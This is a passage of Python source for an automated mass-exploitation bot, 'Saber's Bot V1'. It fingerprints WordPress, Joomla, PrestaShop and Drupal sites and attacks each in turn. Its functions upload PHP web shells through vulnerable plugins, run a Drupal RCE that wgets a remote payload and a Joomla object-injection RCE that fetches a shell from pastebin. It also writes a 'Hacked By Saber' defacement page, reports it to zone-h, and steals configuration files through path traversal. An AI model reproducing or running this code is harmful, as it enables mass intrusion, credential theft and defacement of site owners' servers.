                        print color.GREEN+"[revslider Shell]-VULUN > "+site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'
                        save= open('results/shells.txt', 'a')
                        save.write(site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'+'\n')
                else:
                    print color.RED+"[ShowBiz]-NOT VULUN"
            except:
                print color.RED+"[ShowBiz]-Not Vulun"
                pass
    def simpleadsmanager(site):
            files = {'uploadfile': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "action": "upload_ad_image",
                "path": ""
            }
            url = site + "//wp-content/plugins/simple-ads-manager/sam-ajax-admin.php"
            try : 
                req = requests.post(url, files=files, data=post)
                ww = requests.get(site+"//wp-content/plugins/simple-ads-manager/saber.php")
                if 'Saber BOT V1' in ww.content :
                    print color.GREEN+site+"//wp-content/plugins/simple-ads-manager/saber.php"
                    save = open('results/shells.txt', 'a')
                    save.write(site+"//wp-content/plugins/simple-ads-manager/saber.php"+'\n')
                    save.close()
                else:
                    print color.RED+"[SimpleAdsManager]-NOt Vulun"
            except :
                pass
    #prestazebi
    def columnadverts(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/columnadverts/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/columnadverts/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/modules/columnadverts/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/columnadverts/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[ColumnAdverts]-Not Vulun"
        except :
            print color.RED+"[ColumnAdverts]-Not Vulun"
            pass
    def attributewizardpro(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardpro/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardpro]-Vulun : "+site+'/modules/attributewizardpro/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardpro/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardpro]-Not Vulun"
        except :
            print color.RED+"[attributewizardpro]-Not Vulun"
            pass

    def soopamobile(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/soopamobile/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/soopamobile/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[SoopaMobile]-Vulun : "+site+'/modules/soopamobile/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/soopamobile/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[SoopaMobile]-Not Vulun"
        except :
            print color.RED+"[SoopaMobile]-Not Vulun"
            pass
    def attributewizardproOLD(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardproOLD/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardproOLD]-Vulun : "+site+'/modules/attributewizardproOLD/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardproOLD/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardproOLD]-Not Vulun"
        except :
            print color.RED+"[attributewizardproOLD]-Not Vulun"
            pass

    def soopabanners(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/soopabanners/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/soopabanners/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[soopabanners]-Vulun : "+site+'/modules/soopabanners/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/soopabanners/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[soopabanners]-Not Vulun"
        except :
            print color.RED+"[soopabanners]-Not Vulun"
            pass
    def vtermslideshow(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/vtermslideshow/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/vtermslideshow/slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[vtermslideshow]-Vulun : "+site+'/modules/vtermslideshow/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/vtermslideshow/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[vtermslideshow]-Not Vulun"
        except :
            print color.RED+"[vtermslideshow]-Not Vulun"
            pass
    def simpleslideshow(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/simpleslideshow/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[simpleslideshow]-Vulun : "+site+'/modules/simpleslideshow/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/simpleslideshow/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[simpleslideshow]-Not Vulun"
        except :
            print color.RED+"[simpleslideshow]-Not Vulun"
            pass
    def homepageadvertise2(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/homepageadvertise2/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[homepageadvertise2]-Vulun : "+site+'/modules/homepageadvertise2/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/homepageadvertise2/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[homepageadvertise2]-Not Vulun"
        except :
            print color.RED+"[homepageadvertise2]-Not Vulun"
            pass
    def jro_homepageadvertise(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/jro_homepageadvertise/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[jro_homepageadvertise]-Vulun : "+site+'/modules/jro_homepageadvertise/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/jro_homepageadvertise/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[jro_homepageadvertise]-Not Vulun"
        except :
            print color.RED+"[jro_homepageadvertise]-Not Vulun"
            pass
    def oneattributewizardpro(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/oneattributewizardpro/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[oneattributewizardpro]-Vulun : "+site+'/modules/oneattributewizardpro/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/oneattributewizardpro/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[oneattributewizardpro]-Not Vulun"
        except :
            print color.RED+"[oneattributewizardpro]-Not Vulun"
            pass
    def attributewizardpro_x(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/attributewizardpro_x/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[attributewizardpro_x]-Vulun : "+site+'/modules/attributewizardpro_x/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/attributewizardpro_x/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[attributewizardpro_x]-Not Vulun"
        except :
            print color.RED+"[attributewizardpro_x]-Not Vulun"
            pass

    def productpageadverts(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/productpageadverts/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[productpageadverts]-Vulun : "+site+'/modules/productpageadverts/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/productpageadverts/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[productpageadverts]-Not Vulun"
        except :
            print color.RED+"[productpageadverts]-Not Vulun"
            pass
    def homepageadvertise(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/homepageadvertise/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[homepageadvertise]-Vulun : "+site+'/modules/homepageadvertise/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/homepageadvertise/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[homepageadvertise]-Not Vulun"
        except :
            print color.RED+"[homepageadvertise]-Not Vulun"
            pass
    def videostab(site):
        try : 
            ShellFile = {'userfile': open('saber.php.mp4', 'rb')}
            Exploit = '///modules/videostab/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[videostab]-Vulun : "+site+'/modules/videostab/slides/saber.php.mp4'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/videostab/slides/saber.php.mp4'+'\n')
                save.close()
            else:
                print color.RED+"[videostab]-Not Vulun"
        except :
            print color.RED+"[videostab]-Not Vulun"
            pass
    def wg24themeadministration(site):
        try : 
            ShellFile = {'userfile': open('saber.php', 'rb')}
            Exploit = '///modules/wg24themeadministration/uploadimage.php'
            exp = site+Exploit
            GoT = requests.post(exp, files=ShellFile, timeout=5)
            checkk = requests.get(site+'/modules/   /slides/saber.php')
            if 'Saber BOT V1' in checkk.content :
                print color.GREEN+"[wg24themeadministration]-Vulun : "+site+'/modules/wg24themeadministration/slides/saber.php'
                save = open('resulst/shells.txt', 'a')
                save.write(site+'/modules/wg24themeadministration/slides/saber.php'+'\n')
                save.close()
            else:
                print color.RED+"[wg24themeadministration]-Not Vulun"
        except :
            print color.RED+"[wg24themeadministration]-Not Vulun"
            pass
    #drupal
    def drupal(site):
        #upload this script in other shell (or ur localhost) https://pastebin.com/raw/wPAbtyJ4 Thanks Gass <3
        exp = 'http://iphonefixercolchester.co.uk/wp-admin/comment.php'
        po = exp+'?url='+site+'&submit=submit'
        try : 
            zeb = requests.get(po)
            if 'Success' in zeb.content :
                print color.GREEN+"[Drupal ADD Admin]-Vulun : "+site+' User:gassrini pass :admin'
                save = open('results/drupal.txt')
                save.write(site+':gassrini:admin'+'\n')
                save.close()
            else:
                print color.RED+"[Drupal ADD Admin]-Not Vulun"
        except:
            print color.RED+"[Drupal ADD Admin]-Not Vulun"
            pass
    requests.urllib3.disable_warnings()
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'}
    headers = {'User-Agent': 'Mozilla 5.0'}
    def drugeddon(u):
        try:
            url = u + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            r = requests.post(url, data=payload, verify=False, headers=headers)
            if 'Select Your File :' in requests.get(u+'/payload.php', verify=False, headers=headers).text:
                print color.GREEN+'[Drupal Rce]-Vulun ', u + '/payload.php'
                with open('results/shells.txt', mode='a') as d:
                    d.write(u + '/payload.php\n')
            else:
                print color.RED+u, " -> Not exploitable"
        except:
            pass
    def check(site):
        headers = {'User-Agent': 'Mozilla 5.0'}
        requests.urllib3.disable_warnings()
        try : 
            w = requests.get(site, verify=False, headers=headers)
            if 'wordpress' in w.content or '/wp-content/' in w.content :
                save = open('tmp/wordpress.txt', 'a')
                save.write(site+'\n')
                print color.PURPLE+site,'-WordPress'
                print color.GREEN+"[+]Gravity Forms"
                gravity(site)
                print color.GREEN+"[+]Revslider"
                revslider(site)
                print color.GREEN+"[+]ShowBiz"
                showbiz(site)
                print color.GREEN+"[+]AddBlockUrl"
                addblockurl(site)
                print color.GREEN+"[+]CherryPlugin"
                cherry(site)
                print color.GREEN+"[+]Wysija"
                wysija(site)
                print color.GREEN+"[+]FormCaft"
                formcaft(site)
                print color.GREEN+"[+]Revslider Get Config"
                revslidergetconfig(site)
                print color.GREEN+"[+]Work The Flow File Upload"
                wtffu(site)
                print color.GREEN+"[+]SimpleAdsManager"
                simpleadsmanager(site)
                print color.GREEN+"[+]DownloadsManager"
                downloadsmanager(site)
                print color.GREEN+"[+]Inboundio-Marketing"
                inboundiomarketing(site)
                print color.GREEN+"[+]ZoomSound"
                zoomsound(site)
                print color.GREEN+"[+]ReflexGaller"
                reflexgallery(site)
                print color.GREEN+"[+]SexyContactForm"
                sexycontacoform(site)
                print color.GREEN+"[+]PhPCalendarEvenet"
                phpeventcalendar(site)
                print color.GREEN+"[+]WPShop"
            elif 'Joomla' in w.content :
                save = open('tmp/joomla.txt', 'a')
                save.write(site+'\n')
                print color.PURPLE+site,"-Joomla"
                print color.GREEN+"[+]JCE IMAGE"
                jce(site)
                print color.GREEN+"[+]JCE SHELL"
                jceshell(site)
                print color.GREEN+"[+]ALBERGHI"
                alberghi(site)
                print color.GREEN+"[+]RCE"
                rce(site)
                print color.GREEN+"[+]AdsManager Shell"
                adsmanager(site)
                print color.GREEN+"[+]AdsManager Index"
                adsindex(site)
                print color.GREEN+"[+]Com_Fabrik Index"
                fabric_index(site)
                print color.GREEN+"[+]Com_MyBlog"
                myblog(site)
                print color.GREEN+"[+]Cckjseblod"
                cckjseblod(site)
                print color.GREEN+"[+]MacGallery"
                macgallery(site)
                print color.GREEN+"[+]HdfVPlayer"
                hdflvplayer(site)
                print color.GREEN+"[+]ModSimpleFileUpload"
                modsimplefileupload(site)
            elif 'PrestaShop' in w.content :
                print color.PURPLE+site,"-PrestaShop"
                save = open('tmp/prestashop.txt', 'a')
                save.write(site+'\n')
                print color.GREEN+"[+]ColumnAdverts"
                columnadverts(site)
                print color.GREEN+"[+]SoopaMobile"
                soopamobile(site)
                print color.GREEN+"[+]SoopaBanner"
                soopabanners(site)
                print color.GREEN+"[+]VTermSlideShow"
                vtermslideshow(site)
                print color.GREEN+"[+]SimpleSlideShow"
                simpleslideshow(site)
                print color.GREEN+"[+]ProductPageAdverts"
                productpageadverts(site)
                print color.GREEN+"[+]HomePageAdvertise"
                homepageadvertise(site)
                print color.GREEN+"[+]HomePageAdvertise2"
                homepageadvertise2(site)
                print color.GREEN+"[+]JRO_HomePageAdvertise"
                jro_homepageadvertise(site)
                print color.GREEN+"[+]AttributeWizardPro"
                attributewizardpro(site)
                print color.GREEN+"[+]OneAttributeWizardPro"
                oneattributewizardpro(site)
                print color.GREEN+"[+]AttributeWizardProOld"
                attributewizardproOLD(site)
                print color.GREEN+"[+]AttributeWizardPro_X"
                attributewizardpro_x(site)
                print color.GREEN+"[+]VideoStab"
                videostab(site)
                print color.GREEN+"[+]Wg24ThemeAdministration"
                wg24themeadministration(site)
            elif 'Drupal' in w.content or 'drupal' in w.content:
                print color.PURPLE+site,"-Drupal"
                save = open('tmp/drupal.txt', 'a')
                save.write(site+'\n')
                print color.GREEN+"[+]Drupal Add Admin"
                drupal(site)
                print color.GREEN+"[+]Drupal Rce"
                drugeddon(site)
            else:
                print color.RED+site,"[Unkown]"
        except :
            pass
    site = []
    def normal():
        lista = raw_input('[+] Enter List Name : ')
        file = open(lista).readlines()
        if (len(file) > 0):
            for zeb in file:
                nouna = zeb.rstrip()
                check(nouna)
    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    class color:
       PURPLE = '\033[95m'
       CYAN = '\033[96m'
       DARKCYAN = '\033[36m'
       BLUE = '\033[94m'
       GREEN = '\033[92m'
       YELLOW = '\033[93m'
       RED = '\033[91m'
       BOLD = '\033[1m'
       UNDERLINE = '\033[4m'
       END = '\033[0m'
    clear()
    def banner():
        print color.BOLD+logo
        print color.BOLD+"[1]MultiThread Scan"
        print color.BOLD+"[2]SingleThread Scan"
        ch = raw_input(">")
        if ch == '1':
            print "usage : python "+sys.argv[0]+" list.txt"
        if ch == '2':
            normal()
    banner()
    try:
        target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
    except IndexError:
        pass
    if len(sys.argv) == 2:
        try : 
            mp = Pool(150)
            mp.map(check, target)
            mp.close()
            mp.join()
        except :
            pass
def windows() : 
    logo = """
       _____       _               _       ____   ____ _______  __      ____ 
      / ____|     | |             ( )     |  _ \ / __ \__   __| \ \    / /_ |
     | (___   __ _| |__   ___ _ __|/ ___  | |_) | |  | | | |     \ \  / / | |
      \___ \ / _` | '_ \ / _ \ '__| / __| |  _ <| |  | | | |      \ \/ /  | |
      ____) | (_| | |_) |  __/ |    \__ \ | |_) | |__| | | |       \  /   | |
     |_____/ \__,_|_.__/ \___|_|    |___/ |____/ \____/  |_|        \/    |_|
                                                            Saber's Bot V1
                                                            fallagkill3r@gmail.com
                                                            https://www.facebook.com/drwxxrxrx   
    """
    #results
    print logo
    print "Usage : MultiThread : "+sys.argv[0]+" -t threads -u lists"
    print "Usage : SingleThread : "+sys.argv[0]+" -u lists"
    if not os.path.exists("results"):
        os.mkdir("results", 0755);
    if not os.path.exists("tmp"):
        os.mkdir("tmp", 0755);
    #Variables
    rev = 'revsaber.zip'
    grav = 'saber.jpg'
    ind = 'lol.jpg'
    up = 'saber.php'
    cher = 'saber.php'
    mblog = 'blog.php.xxxjpg'
    j1 = 'saber.php3.g'
    j2 = 'jdownloads.zip'
    zebi = 'LOL.gif'
    jcsh = 'saber.php'
    fabric = "saber.txt"
    terma = 'LOL.gif'
    ads = 'saber.jpg'
    asindex = 'LOL.jpg'
    user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
    payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/saber.php','w+'),file_get_contents('https://pastebin.com/raw/nmcSiKfw')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/images/saber.php","w+"),file_get_contents("https://pastebin.com/raw/nmcSiKfw"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/LOL.html','w+'),' Hacked By Saber ');"""
    #Zone-h
    def zone(url) :
        r = requests.post("http://zone-h.com/notify/single", data={'defacer': 'fallag kill3r', 'domain1': url, 'hackmode': 1, 'reason': 1})
        if 'ERROR' in  r.content :
            print color.RED+"Zone-H : ERROR"
        else :
            print color.GREEN+"Zone-H : OK"
    #RCE
    def prepare(url, ua):
        try:
            global user_agent
            headers = {
                'User-Agent' : user_agent,
                'x-forwarded-for' : ua
            }
            cookies = urllib2.Request(url, headers=headers)
            result = urllib2.urlopen(cookies)
            cookieJar = result.info().getheader('Set-Cookie')
            injection = urllib2.Request(url, headers=headers)
            injection.add_header('Cookie', cookieJar)
            urllib2.urlopen(injection)
        except:
            pass
    def toCharCode(string):
        try:
            encoded = ""
            for char in string:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass
    def generate(payload):
        php_payload = "eval({0})".format(toCharCode(payload))
        terminate = '\xf0\xfd\xfd\xfd';
        exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
        injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
        exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
        exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
        return exploit_template
    def rce(url):
        try:
            global payload
            payload_generated = generate(payload)
            prepare(url, payload_generated)
            tester = urllib2.urlopen(url+"/saber.php").read()
            ww = requests.get(url+"/LOL.html")
            if re.findall("Saber", tester) and urllib2.urlopen(url+"/saber.php").getcode() == 200 and "Hacked" in ww.content:
                site = url + "/saber.php"
                site2 = url + "/LOL.html"
                print color.GREEN+"Defaced > "+site2
                zone(site2)
                print color.GREEN+"Shell uploaded > "+site
                with open("results/index.txt", 'a') as neo:
                    neo.write("%s" %  site2)
                    neo.write("\n")
                with open("results/shells.txt", 'a') as neo:
                    neo.write("%s" %  site)
                    neo.write("\n")
        except:
            print color.RED+"[RCE]-NOT VULUN"
            pass
    #JCE
    def jce(site):
        try :
            global zebi
            files = {'Filedata': open(zebi, 'rb')}
            post = {
                'upload-dir': '../../',
                'upload-overwrite': '0',
                'action': 'upload'
            }
            url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall('No function call specified', line):
                    req = requests.post(url,files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = site+'/LOL.gif'
                        if requests.get(url).status_code == 200:
                            print color.BOLD+"[VULUN] "+url
                            zone(url)
                            with open("results/index.txt", 'a') as neo:
                                neo.write("%s" %  url)
                                neo.write("\n")
                    else:
                        print color.RED+"[JCE]-NOT VULUN"
        except :
            pass
    def alberghi(site):
        try:
            global terma
            files = {'userfile': open(terma, 'rb')}
            url = site + "/administrator/components/com_alberghi/upload.alberghi.php"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall('Upload', line):
                    req = requests.post(url,files=files)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/administrator/components/com_alberghi/upload.alberghi.php', '/administrator/components/com_alberghi/' + terma)
                        if urllib2.urlopen(url).getcode() == 200:
                            print color.BOLD+"Alberghi-[VULUN] => "+url
                            zone(url)
                            with open("results/index.txt", 'a') as neo:
                                neo.write("%s" %  url)
                                neo.write("\n")
        except:
            print color.RED+"[AlBerghi]-NOT VULUN"
            pass
    def jceshell(site):
        try:
            global jcsh
            files = {'Filedata': open(jcsh, 'rb')}
            post = {
                'upload-dir': '../../',
                'upload-overwrite': '0',
                'action': 'upload'
            }
            url = site + "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form"
            req = requests.post(url,files=files, data=post)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', '/' + jcsh)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                if re.findall("Saber", readbing):
                    print color.BOLD+"[JCE_SHELL]-VULUN >",url
                    with open("results/shells.txt", 'a') as neo:
                        neo.write("%s" %  url)
                        neo.write("\n")
        except:
            print color.RED+"[JCE Shell]-NOT VULUN"
    def adsmanager(site):
        try:
            global ads
            files = {'file': open(ads, 'rb')}
            post = {
                "name": "saber.php"
            }
            url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall("jsonrpc", line):
                    req = requests.post(url, files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/index.php?option=ads&task=upload&tmpl=component',
                                  '/tmp/plupload/' + ads)
                        openbing = urllib2.urlopen(url)
                        readbing = openbing.read()
                        if re.findall("Saber", readbing):
                            print color.BOLD+"[AdsManager]-VULUN > "+url
                            with open("results/shells.txt", 'a') as neo:
                                neo.write("%s" %  url)
                                neo.write("\n")
        except:
            print color.RED+"[AdsManager Shell]-NOT VULUN"
            pass
    def adsindex(site):
        try:
            global asindex
            files = {'file': open(asindex, 'rb')}
            post = {
                "name": "LOL.html"
            }
            url = site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            html = urllib2.urlopen(url).readlines()
            for line in html:
                if re.findall("jsonrpc", line):
                    req = requests.post(url, files=files, data=post)
                    if req.status_code == 200 or 'success' in req.text:
                        url = url.replace('/index.php?option=com_adsmanager&task=upload&tmpl=component',
                                  '/tmp/plupload/' + asindex)
                        openbing = urllib2.urlopen(url)
                        readbing = openbing.read()
                        if re.findall("Saber", readbing):
                            print color.BOLD+"[AdsManager_Index]-VULUN > "+url
                            with open("results/index.txt", 'a') as neo:
                                neo.write("%s" %  url)
                                neo.write("\n")

        except:
            print color.RED+"[AdsManager Index]-NOT VULUN"
            pass
    def modsimplefileupload(site):
        Exploit = '//modules/mod_simplefileuploadv1.3/elements/udd.php'
        CheckVuln = requests.get(site + Exploit, timeout=5)
        try:
            files = {'file': ('saber.php', open('saber.php', 'rb'), 'multipart/form-data')}
            post = {
                "submit": "Upload"
            }
            GoT = requests.post(site + Exploit, files=IndeXfile, data=post, timeout=5)
            url = site+'//modules/mod_simplefileuploadv1.3/elements/saber.php'
            check =requests.get(url)
            if 'Saber BOT V1' in check.content:
                print color.GREEN+"[ModSimpleFileUpload]-VULUN "+url
                with open("results/shells.txt", 'a') as neo:
                    neo.write("%s" %  url)
                    neo.write("\n")
            else:
                print color.RED+"[ModSimpleFileUpload]-NOT VULUN"
        except:
            print color.RED+"[ModSimpleFileUpload]-NOT VULUN"
            pass
    def fabric_index(site):
        try:
            global fabric
            files = {'userfile': (fabric, open(fabric, 'rb'), 'multipart/form-data')}
            post = {
                "name": "sexy.php",
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            }
            url = site + "/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table="
            req = requests.post(url, files=files, data=post)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=',
                                  '/media/' + fabric)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                if re.findall("Hacked", readbing):
                    print color.BOLD+"[Com_Fabrik Index]-VULUN > "+url
                    with open("results/index.txt", 'a') as neo:
                        neo.write("%s" %  url)
                        neo.write("\n")
            else:
                print color.RED+"[Com_Fabrik]-NOT VULUN"
        except:
            pass
    def myblog(site):
        try:
            global mblog
            files = {'fileToUpload': open(mblog, 'rb')}
            url = site + "/index.php?option=com_myblog&task=ajaxupload"
            req = requests.post(url,files=files)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/index.php?option=com_myblog&task=ajaxupload', '/images/' + mblog)
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                url2 = site + '/images/stories/' + mblog
                test2 = urllib2.urlopen(url2)
                readtest2 = test2.read()
                if re.findall("Saber", readbing) or re.findall("Tryag File Manager", readtest2):
                    print color.BOLD+"[Com_MyBlog]-VULUN > "+url
                    with open("results/shells.txt", 'a') as neo:
                        neo.write("%s" %  url)
                        neo.write("\n")
            else:
                print color.RED+"[MyBlog]-NOT VULUN"
        except:
            pass
    def cckjseblod(url):
        try:
            response = urllib2.urlopen(url+"/index.php?option=com_cckjseblod&task=download&file=configuration.php")
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/index.php?option=com_cckjseblod&task=download&file=configuration.php"
                print color.BOLD+"[cckjseblod]-VULUN > "+site
                with open("results/config.txt", 'a') as neo:
                    neo.write("%s" %  url)
                    neo.write("\n")
            else:
                print color.RED+"[cckjseblod]-NOT VULUN"
        except urllib2.HTTPError:
            pass
        except urllib2.URLError:
            pass
    def macgallery(url):
        try:
            response = urllib2.urlopen(url+"/index.php?option=com_macgallery&view=download&albumid=../../configuration.php")
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/index.php?option=com_macgallery&view=download&albumid=../../configuration.php"
                print color.BOLD+"[MacGallery]-VULUN > "+site
                with open("results/config.txt", 'a') as neo:
                    neo.write("%s" %  url)
                    neo.write("\n")
            else:
                pass
        except urllib2.HTTPError:
            print color.RED+"[MacGallery]-NOT VULUN"
            pass
        except urllib2.URLError:
            pass
    def hdflvplayer(url):
        try:
            req = urllib2.Request(url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php")
            response = urllib2.urlopen(req)
            content = response.read()
            if content != "" and not "failed to open stream" in content and re.findall("JConfig", content):
                site = url + "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
                print color.BOLD+"[HdfVPlayer]-VULUN > "+site
                with open("results/config.txt", 'a') as neo:
                    neo.write("%s" %  url)
                    neo.write("\n")

        except urllib2.HTTPError:
            print color.RED+"[HdflVplayer]-NOT VULUN"
            pass
        except urllib2.URLError:
            pass
